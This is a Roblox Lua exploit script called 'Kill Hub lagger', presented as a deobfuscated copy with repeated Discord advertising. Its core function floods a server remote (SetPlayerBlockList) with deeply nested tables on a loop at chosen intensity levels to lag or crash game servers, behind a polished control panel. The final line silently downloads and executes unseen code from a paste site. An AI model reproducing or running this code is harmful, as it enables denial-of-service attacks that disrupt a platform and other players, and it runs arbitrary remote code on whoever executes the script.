-- New kill hub lagger

print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local ConfigFile = "KillHubConfig.json"
local NIVELES = {
    Low   = { poder = 23 },
    Mid   = { poder = 32 },
    High  = { poder = 70 },
    Ultra = { poder = 90 }
}
local keybind = Enum.KeyCode.F
local listeningForInput = false
local laggerActive = false
local lagThread = nil
local nivelActual = "Low"
local ventanaBloqueada = false
local currentScale = 1.0
local MIN_SCALE = 0.55
local MAX_SCALE = 1.45
local SCALE_STEP = 0.12
local function SaveConfig()
    local data = {
        Nivel = nivelActual,
        Bloqueado = ventanaBloqueada,
        Keybind = keybind.Name
    }
    pcall(function()
        writefile(ConfigFile, HttpService:JSONEncode(data))
    end)
end
local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            nivelActual = data.Nivel or "Low"
            ventanaBloqueada = data.Bloqueado or false
            if data.Keybind then
                local success, key = pcall(function()
                    return Enum.KeyCode[data.Keybind]
                end)
                if success and key then
                    keybind = key
                end
            end
        end)
    end
end
LoadConfig()
local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 25 do
        local t = {}
        table.insert(z, t)
        z = t
    end
    local max = math.min(12000, poder * 50)
    for i = 1, max do
        table.insert(main, spam)
    end
    pcall(function()
        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main)
    end)
end
local function CreateBillboard()
    local character = player.Character or player.CharacterAdded:Wait()
    local head = character:WaitForChild("Head")
    if head:FindFirstChild("KillHubBillboard") then
        head.KillHubBillboard:Destroy()
    end
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "KillHubBillboard"
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 300, 0, 50)
    billboard.StudsOffset = Vector3.new(0, 4.5, 0)
    billboard.AlwaysOnTop = true
    billboard.MaxDistance = 100
    billboard.Parent = head
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = "https://discord.gg/killhub"
    textLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    textLabel.TextStrokeTransparency = 0.3
    textLabel.TextSize = 37
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextScaled = false
    textLabel.Parent = billboard
end
CreateBillboard()
player.CharacterAdded:Connect(function()
    task.wait(0.5)
    CreateBillboard()
end)
local KillHub_UI = Instance.new("ScreenGui")
KillHub_UI.Name = "KillHub_UI"
KillHub_UI.ResetOnSpawn = false
KillHub_UI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
KillHub_UI.Parent = player:WaitForChild("PlayerGui")
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Active = true
MainFrame.ClipsDescendants = true
MainFrame.Position = UDim2.new(0.15, -30, 0.5, -39)
MainFrame.Size = UDim2.new(0, 219, 0, 94)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = KillHub_UI
local MainScale = Instance.new("UIScale")
MainScale.Scale = currentScale
MainScale.Parent = MainFrame
local function updateScale()
    TweenService:Create(MainScale, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Scale = currentScale
    }):Play()
end
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = MainFrame
local ImageLabel = Instance.new("ImageLabel")
ImageLabel.ZIndex = 0
ImageLabel.Position = UDim2.new(-0.05, 0, -0.05, 0)
ImageLabel.Size = UDim2.new(1, 20, 1, 20)
ImageLabel.BackgroundTransparency = 1
ImageLabel.Image = "rbxassetid://1316046136"
ImageLabel.ImageColor3 = Color3.fromRGB(150, 150, 220)
ImageLabel.ImageTransparency = 0.6
ImageLabel.Parent = MainFrame
local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
Frame.Parent = MainFrame
local UICorner2 = Instance.new("UICorner")
UICorner2.CornerRadius = UDim.new(0, 10)
UICorner2.Parent = Frame
local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 10, 15)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(20, 20, 30)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 5, 10))
})
UIGradient.Rotation = 135
UIGradient.Parent = Frame
local Frame2 = Instance.new("Frame")
Frame2.ZIndex = 3
Frame2.Size = UDim2.new(1, 0, 0, 25)
Frame2.BackgroundTransparency = 1
Frame2.Parent = Frame
local TextLabel = Instance.new("TextLabel")
TextLabel.Position = UDim2.new(0, 9, 0, 1)
TextLabel.Size = UDim2.new(0, 84, 0, 21)
TextLabel.BackgroundTransparency = 1
TextLabel.Text = "KILL HUB"
TextLabel.TextColor3 = Color3.fromRGB(208, 218, 253)
TextLabel.TextSize = 16
TextLabel.Font = Enum.Font.GothamBlack
TextLabel.TextXAlignment = Enum.TextXAlignment.Left
TextLabel.TextStrokeColor3 = Color3.fromRGB(40, 40, 80)
TextLabel.TextStrokeTransparency = 0.4
TextLabel.Parent = Frame2
local TextButton = Instance.new("TextButton")
TextButton.ZIndex = 5
TextButton.Position = UDim2.new(1, -114, 0, 4)
TextButton.Size = UDim2.new(0, 19, 0, 17)
TextButton.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
TextButton.BackgroundTransparency = 0.3
TextButton.Text = "-"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 13
TextButton.Font = Enum.Font.GothamBold
TextButton.AutoButtonColor = false
TextButton.Parent = Frame2
local UICorner3 = Instance.new("UICorner")
UICorner3.CornerRadius = UDim.new(0, 4)
UICorner3.Parent = TextButton
local TextButton2 = Instance.new("TextButton")
TextButton2.ZIndex = 5
TextButton2.Position = UDim2.new(1, -91, 0, 4)
TextButton2.Size = UDim2.new(0, 19, 0, 17)
TextButton2.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
TextButton2.BackgroundTransparency = 0.3
TextButton2.Text = "+"
TextButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton2.TextSize = 13
TextButton2.Font = Enum.Font.GothamBold
TextButton2.AutoButtonColor = false
TextButton2.Parent = Frame2
local UICorner4 = Instance.new("UICorner")
UICorner4.CornerRadius = UDim.new(0, 4)
UICorner4.Parent = TextButton2
local TextLabel2 = Instance.new("TextLabel")
TextLabel2.Position = UDim2.new(1, -54, 0, 3)
TextLabel2.Size = UDim2.new(0, 44, 0, 17)
TextLabel2.BackgroundTransparency = 1
TextLabel2.Text = ventanaBloqueada and "LOCK" or "UNLOCK"
TextLabel2.TextColor3 = Color3.fromRGB(180, 180, 180)
TextLabel2.TextSize = 6
TextLabel2.Font = Enum.Font.GothamBold
TextLabel2.TextXAlignment = Enum.TextXAlignment.Right
TextLabel2.Parent = Frame2
local TextButton3 = Instance.new("TextButton")
TextButton3.ZIndex = 6
TextButton3.Position = UDim2.new(1, -59, 0, 1)
TextButton3.Size = UDim2.new(0, 49, 0, 21)
TextButton3.BackgroundTransparency = 1
TextButton3.Text = ""
TextButton3.Parent = Frame2
local Frame3 = Instance.new("Frame")
Frame3.ZIndex = 3
Frame3.Position = UDim2.new(0, 0, 0, 25)
Frame3.Size = UDim2.new(1, 0, 0, 25)
Frame3.BackgroundTransparency = 1
Frame3.Parent = Frame
local Frame4 = Instance.new("Frame")
Frame4.Position = UDim2.new(0.05, 0, 0, 0)
Frame4.Size = UDim2.new(0.9, 0, 0, 1)
Frame4.BackgroundColor3 = Color3.fromRGB(60, 60, 100)
Frame4.BackgroundTransparency = 0.7
Frame4.Parent = Frame3
local TextLabel3 = Instance.new("TextLabel")
TextLabel3.Position = UDim2.new(0, 11, 0, 3)
TextLabel3.Size = UDim2.new(0, 59, 0, 17)
TextLabel3.BackgroundTransparency = 1
TextLabel3.Text = "LAGGER"
TextLabel3.TextColor3 = Color3.fromRGB(200, 210, 240)
TextLabel3.TextSize = 9
TextLabel3.Font = Enum.Font.GothamBold
TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
TextLabel3.Parent = Frame3
local TextButton4 = Instance.new("TextButton")
TextButton4.ZIndex = 5
TextButton4.Position = UDim2.new(1, -154, 0, 4)
TextButton4.Size = UDim2.new(0, 34, 0, 17)
TextButton4.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
TextButton4.BackgroundTransparency = 0.3
TextButton4.Text = "[" .. keybind.Name .. "]"
TextButton4.TextColor3 = Color3.fromRGB(180, 200, 255)
TextButton4.TextSize = 7
TextButton4.Font = Enum.Font.GothamBlack
TextButton4.AutoButtonColor = false
TextButton4.Parent = Frame3
local UICorner5 = Instance.new("UICorner")
UICorner5.CornerRadius = UDim.new(0, 4)
UICorner5.Parent = TextButton4
local TextButton5 = Instance.new("TextButton")
TextButton5.ZIndex = 5
TextButton5.Position = UDim2.new(1, -51, 0, 4)
TextButton5.Size = UDim2.new(0, 39, 0, 17)
TextButton5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton5.Text = "OFF"
TextButton5.TextColor3 = Color3.fromRGB(150, 150, 180)
TextButton5.TextSize = 7
TextButton5.Font = Enum.Font.GothamBold
TextButton5.AutoButtonColor = false
TextButton5.Parent = Frame3
local UICorner6 = Instance.new("UICorner")
UICorner6.CornerRadius = UDim.new(1, 0)
UICorner6.Parent = TextButton5
local Frame5 = Instance.new("Frame")
Frame5.ZIndex = 5
Frame5.Position = UDim2.new(1, -63, 0, 10)
Frame5.Size = UDim2.new(0, 5, 0, 5)
Frame5.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
Frame5.Parent = Frame3
local UICorner7 = Instance.new("UICorner")
UICorner7.CornerRadius = UDim.new(1, 0)
UICorner7.Parent = Frame5
local Frame6 = Instance.new("Frame")
Frame6.ZIndex = 3
Frame6.Position = UDim2.new(0, 0, 0, 52)
Frame6.Size = UDim2.new(1, 0, 0, 40)
Frame6.BackgroundTransparency = 1
Frame6.Parent = Frame
local Frame7 = Instance.new("Frame")
Frame7.Position = UDim2.new(0.05, 0, 0, 0)
Frame7.Size = UDim2.new(0.9, 0, 0, 1)
Frame7.BackgroundColor3 = Color3.fromRGB(60, 60, 100)
Frame7.BackgroundTransparency = 0.7
Frame7.Parent = Frame6
local Frame8 = Instance.new("Frame")
Frame8.ZIndex = 4
Frame8.Size = UDim2.new(1, 0, 1, 0)
Frame8.BackgroundTransparency = 1
Frame8.Parent = Frame6
local TextButton6 = Instance.new("TextButton")
TextButton6.ZIndex = 5
TextButton6.Position = UDim2.new(0, 4, 0, 10)
TextButton6.Size = UDim2.new(0, 45, 0, 19)
TextButton6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton6.BackgroundTransparency = 0.2
TextButton6.BorderColor3 = Color3.fromRGB(50, 50, 80)
TextButton6.Text = "LOW"
TextButton6.TextColor3 = Color3.fromRGB(200, 210, 240)
TextButton6.TextSize = 9
TextButton6.Font = Enum.Font.GothamBold
TextButton6.AutoButtonColor = false
TextButton6.Parent = Frame8
local UICorner8 = Instance.new("UICorner")
UICorner8.CornerRadius = UDim.new(0, 4)
UICorner8.Parent = TextButton6
local Frame9 = Instance.new("Frame")
Frame9.ZIndex = 0
Frame9.Size = UDim2.new(1, 0, 1, 0)
Frame9.BackgroundColor3 = Color3.fromRGB(160, 80, 255)
Frame9.BackgroundTransparency = 0.9
Frame9.Parent = TextButton6
local UICorner9 = Instance.new("UICorner")
UICorner9.CornerRadius = UDim.new(0, 4)
UICorner9.Parent = Frame9
local TextButton7 = Instance.new("TextButton")
TextButton7.ZIndex = 5
TextButton7.Position = UDim2.new(0, 59, 0, 10)
TextButton7.Size = UDim2.new(0, 45, 0, 19)
TextButton7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton7.BackgroundTransparency = 0.2
TextButton7.BorderColor3 = Color3.fromRGB(50, 50, 80)
TextButton7.Text = "MID"
TextButton7.TextColor3 = Color3.fromRGB(200, 210, 240)
TextButton7.TextSize = 9
TextButton7.Font = Enum.Font.GothamBold
TextButton7.AutoButtonColor = false
TextButton7.Parent = Frame8
local UICorner10 = Instance.new("UICorner")
UICorner10.CornerRadius = UDim.new(0, 4)
UICorner10.Parent = TextButton7
local Frame10 = Instance.new("Frame")
Frame10.ZIndex = 0
Frame10.Size = UDim2.new(1, 0, 1, 0)
Frame10.BackgroundColor3 = Color3.fromRGB(160, 80, 255)
Frame10.BackgroundTransparency = 0.9
Frame10.Parent = TextButton7
local UICorner11 = Instance.new("UICorner")
UICorner11.CornerRadius = UDim.new(0, 4)
UICorner11.Parent = Frame10
local TextButton8 = Instance.new("TextButton")
TextButton8.ZIndex = 5
TextButton8.Position = UDim2.new(0, 114, 0, 10)
TextButton8.Size = UDim2.new(0, 45, 0, 19)
TextButton8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton8.BackgroundTransparency = 0.2
TextButton8.BorderColor3 = Color3.fromRGB(50, 50, 80)
TextButton8.Text = "HIGH"
TextButton8.TextColor3 = Color3.fromRGB(200, 210, 240)
TextButton8.TextSize = 9
TextButton8.Font = Enum.Font.GothamBold
TextButton8.AutoButtonColor = false
TextButton8.Parent = Frame8
local UICorner12 = Instance.new("UICorner")
UICorner12.CornerRadius = UDim.new(0, 4)
UICorner12.Parent = TextButton8
local Frame11 = Instance.new("Frame")
Frame11.ZIndex = 0
Frame11.Size = UDim2.new(1, 0, 1, 0)
Frame11.BackgroundColor3 = Color3.fromRGB(160, 80, 255)
Frame11.BackgroundTransparency = 0.9
Frame11.Parent = TextButton8
local UICorner13 = Instance.new("UICorner")
UICorner13.CornerRadius = UDim.new(0, 4)
UICorner13.Parent = Frame11
local TextButton9 = Instance.new("TextButton")
TextButton9.ZIndex = 5
TextButton9.Position = UDim2.new(0, 169, 0, 10)
TextButton9.Size = UDim2.new(0, 45, 0, 19)
TextButton9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton9.BackgroundTransparency = 0.2
TextButton9.BorderColor3 = Color3.fromRGB(50, 50, 80)
TextButton9.Text = "ULTRA"
TextButton9.TextColor3 = Color3.fromRGB(200, 210, 240)
TextButton9.TextSize = 9
TextButton9.Font = Enum.Font.GothamBold
TextButton9.AutoButtonColor = false
TextButton9.Parent = Frame8
local UICorner14 = Instance.new("UICorner")
UICorner14.CornerRadius = UDim.new(0, 4)
UICorner14.Parent = TextButton9
local Frame12 = Instance.new("Frame")
Frame12.ZIndex = 0
Frame12.Size = UDim2.new(1, 0, 1, 0)
Frame12.BackgroundColor3 = Color3.fromRGB(160, 80, 255)
Frame12.BackgroundTransparency = 0.9
Frame12.Parent = TextButton9
local UICorner15 = Instance.new("UICorner")
UICorner15.CornerRadius = UDim.new(0, 4)
UICorner15.Parent = Frame12
local Frame13 = Instance.new("Frame")
Frame13.ZIndex = 2
Frame13.Size = UDim2.new(1, 0, 0, 1)
Frame13.BackgroundColor3 = Color3.fromRGB(100, 100, 150)
Frame13.BackgroundTransparency = 0.7
Frame13.BorderSizePixel = 0
Frame13.Parent = MainFrame
local Frame14 = Instance.new("Frame")
Frame14.Visible = false
Frame14.ZIndex = 10
Frame14.Position = UDim2.new(0.5, -140, 0.5, -65)
Frame14.Size = UDim2.new(0, 280, 0, 130)
Frame14.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
Frame14.BackgroundTransparency = 0.05
Frame14.BorderColor3 = Color3.fromRGB(150, 50, 220)
Frame14.Parent = KillHub_UI
local UICorner16 = Instance.new("UICorner")
UICorner16.CornerRadius = UDim.new(0, 10)
UICorner16.Parent = Frame14
local Frame15 = Instance.new("Frame")
Frame15.ZIndex = 0
Frame15.Size = UDim2.new(1, 0, 1, 0)
Frame15.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame15.BackgroundTransparency = 0.4
Frame15.Parent = Frame14
local UICorner17 = Instance.new("UICorner")
UICorner17.CornerRadius = UDim.new(0, 10)
UICorner17.Parent = Frame15
local TextLabel4 = Instance.new("TextLabel")
TextLabel4.Position = UDim2.new(0, 0, 0, 8)
TextLabel4.Size = UDim2.new(1, 0, 0, 24)
TextLabel4.BackgroundTransparency = 1
TextLabel4.Text = "⚠️ WARNING"
TextLabel4.TextColor3 = Color3.fromRGB(255, 80, 80)
TextLabel4.TextSize = 16
TextLabel4.Font = Enum.Font.GothamBlack
TextLabel4.Parent = Frame14
local TextLabel5 = Instance.new("TextLabel")
TextLabel5.Position = UDim2.new(0, 15, 0, 36)
TextLabel5.Size = UDim2.new(1, -30, 0, 45)
TextLabel5.BackgroundTransparency = 1
TextLabel5.Text = "ACTIVATE ULTRA MODE?\n⚠️ MAY CRASH YOUR GAME"
TextLabel5.TextColor3 = Color3.fromRGB(200, 210, 240)
TextLabel5.TextSize = 10
TextLabel5.Font = Enum.Font.Gotham
TextLabel5.TextYAlignment = Enum.TextYAlignment.Top
TextLabel5.TextWrapped = true
TextLabel5.Parent = Frame14
local TextButton10 = Instance.new("TextButton")
TextButton10.Position = UDim2.new(0.1, 0, 0.75, 0)
TextButton10.Size = UDim2.new(0, 100, 0, 28)
TextButton10.BackgroundColor3 = Color3.fromRGB(0, 180, 80)
TextButton10.BorderSizePixel = 0
TextButton10.Text = "YES"
TextButton10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton10.TextSize = 12
TextButton10.Font = Enum.Font.GothamBold
TextButton10.Parent = Frame14
local UICorner18 = Instance.new("UICorner")
UICorner18.CornerRadius = UDim.new(0, 6)
UICorner18.Parent = TextButton10
local TextButton11 = Instance.new("TextButton")
TextButton11.Position = UDim2.new(0.55, 0, 0.75, 0)
TextButton11.Size = UDim2.new(0, 100, 0, 28)
TextButton11.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
TextButton11.BorderSizePixel = 0
TextButton11.Text = "NO"
TextButton11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton11.TextSize = 12
TextButton11.Font = Enum.Font.GothamBold
TextButton11.Parent = Frame14
local UICorner19 = Instance.new("UICorner")
UICorner19.CornerRadius = UDim.new(0, 6)
UICorner19.Parent = TextButton11
local VIOLET = Color3.fromRGB(160, 80, 255)
local function actualizarBotonesNivel()
    local buttons = {
        {btn = TextButton6, frame = Frame9, nivel = "Low"},
        {btn = TextButton7, frame = Frame10, nivel = "Mid"},
        {btn = TextButton8, frame = Frame11, nivel = "High"},
        {btn = TextButton9, frame = Frame12, nivel = "Ultra"}
    }
    for _, data in ipairs(buttons) do
        if nivelActual == data.nivel then
            data.btn.BackgroundColor3 = VIOLET
            data.btn.BackgroundTransparency = 0.25
            data.btn.TextColor3 = Color3.fromRGB(255, 255, 255)
            data.frame.BackgroundColor3 = VIOLET
            data.frame.BackgroundTransparency = 0.5
        else
            data.btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            data.btn.BackgroundTransparency = 0.2
            data.btn.TextColor3 = Color3.fromRGB(200, 210, 240)
            data.frame.BackgroundColor3 = VIOLET
            data.frame.BackgroundTransparency = 0.9
        end
    end
end
local function actualizarToggle()
    if laggerActive then
        TextButton5.Text = "ON"
        TextButton5.TextColor3 = Color3.fromRGB(0, 255, 100)
        TextButton5.BackgroundColor3 = Color3.fromRGB(0, 40, 20)
        Frame5.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
    else
        TextButton5.Text = "OFF"
        TextButton5.TextColor3 = Color3.fromRGB(150, 150, 180)
        TextButton5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        Frame5.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    end
end
local function actualizarKeybind()
    local display = keybind.Name
    if display:match("Button") then
        display = display:gsub("Button", "")
    end
    TextButton4.Text = "[" .. display .. "]"
end
local function actualizarLock()
    TextLabel2.Text = ventanaBloqueada and "LOCK" or "UNLOCK"
    TextLabel2.TextColor3 = ventanaBloqueada and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(180, 180, 180)
end
local function toggleLagger()
    laggerActive = not laggerActive
    actualizarToggle()
    if laggerActive then
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function()
                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000)
                end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.18)
            end
        end)
    else
        if lagThread then
            task.cancel(lagThread)
            lagThread = nil
        end
    end
end
TextButton5.MouseButton1Click:Connect(toggleLagger)
TextButton4.MouseButton1Click:Connect(function()
    if listeningForInput then return end
    listeningForInput = true
    TextButton4.Text = "[...]"
    TextButton4.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
end)
UserInputService.InputBegan:Connect(function(input, gp)
    if listeningForInput and not gp then
        if input.KeyCode ~= Enum.KeyCode.Unknown then
            keybind = input.KeyCode
            actualizarKeybind()
            listeningForInput = false
            TextButton4.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
            SaveConfig()
        end
    end
    if not gp and not listeningForInput then
        if input.KeyCode == keybind then
            toggleLagger()
        end
    end
end)
TextButton6.MouseButton1Click:Connect(function()
    nivelActual = "Low"
    actualizarBotonesNivel()
    SaveConfig()
end)
TextButton7.MouseButton1Click:Connect(function()
    nivelActual = "Mid"
    actualizarBotonesNivel()
    SaveConfig()
end)
TextButton8.MouseButton1Click:Connect(function()
    nivelActual = "High"
    actualizarBotonesNivel()
    SaveConfig()
end)
TextButton9.MouseButton1Click:Connect(function()
    Frame14.Visible = true
end)
TextButton10.MouseButton1Click:Connect(function()
    nivelActual = "Ultra"
    actualizarBotonesNivel()
    SaveConfig()
    Frame14.Visible = false
end)
TextButton11.MouseButton1Click:Connect(function()
    Frame14.Visible = false
end)
TextButton3.MouseButton1Click:Connect(function()
    ventanaBloqueada = not ventanaBloqueada
    actualizarLock()
    SaveConfig()
end)
TextButton.MouseButton1Click:Connect(function()
    if currentScale > MIN_SCALE then
        currentScale = math.max(MIN_SCALE, currentScale - SCALE_STEP)
        updateScale()
    end
end)
TextButton2.MouseButton1Click:Connect(function()
    if currentScale < MAX_SCALE then
        currentScale = math.min(MAX_SCALE, currentScale + SCALE_STEP)
        updateScale()
    end
end)
local isDragging, dragStart, startPos = false, nil, nil
MainFrame.InputBegan:Connect(function(input)
    if ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if not isDragging or ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)
MainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)
actualizarBotonesNivel()
actualizarToggle()
actualizarKeybind()
actualizarLock()


print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")

print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")
print("new kill hub deobf by discord.gg/noxaduels")

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()